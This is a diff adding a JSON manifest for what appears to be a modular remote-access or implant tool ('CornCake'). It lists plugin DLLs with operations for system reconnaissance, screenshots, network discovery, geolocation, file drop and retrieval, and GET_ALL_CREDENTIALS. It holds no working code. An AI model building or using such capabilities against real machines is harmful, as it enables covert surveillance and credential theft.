@@ -1,0 +1,65 @@
+{
+    "figs": [
+        {
+            "name": "SystemInformationFig",
+            "dll_path": "CornCake\\releases\\SystemInformationFig.dll",
+            "fig_id": 1,
+            "version_major": 1,
+            "version_minor": 0,
+            "operations": {
+                "0": "RESERVED",
+                "1": "OS_INFO",
+                "2": "USERS_INFO",
+                "3": "PHYSICAL_DRIVES_INFO",
+                "4": "BIOS_INFO"
+            }
+        },
+        {
+            "name": "ScreenSaverFig",
+            "dll_path": "CornCake\\releases\\ScreenSaverFig.dll",
+            "fig_id": 3,
+            "version_major": 1,
+            "version_minor": 0,
+            "operations": {
+                "0": "RESERVED",
+                "1": "TAKE_SCREENSHOT"
+            }
+        },
+        {
+            "name": "PrizePresenterFig",
+            "dll_path": "CornCake\\releases\\PrizePresenterFig.dll",
+            "fig_id": 4,
+            "version_major": 1,
+            "version_minor": 0,
+            "operations": {
+                "0": "RESERVED",
+                "1": "GET_ALL_CREDENTIALS"
+            }
+        },
+        {
+            "name": "GeoDudeFig",
+            "dll_path": "CornCake\\releases\\GeoDudeFig.dll",
+            "fig_id": 5,
+            "version_major": 1,
+            "version_minor": 0,
+            "operations": {
+                "0": "RESERVED",
+                "1": "DISCOVER_NETWORKS",
+                "2": "FETCH_GEO_LOCATION"
+            }
+        },
+        {
+            "name": "FileOperationsFig",
+            "dll_path": "CornCake\\releases\\FileOperationsFig.dll",
+            "fig_id": 2,
+            "version_major": 1,
+            "version_minor": 0,
+            "operations": {
+                "0": "RESERVED",
+                "1": "DIRLIST",
+                "2": "DROP_FILE",
+                "3": "GET_FILE"
+            }
+        }
+    ]
+}
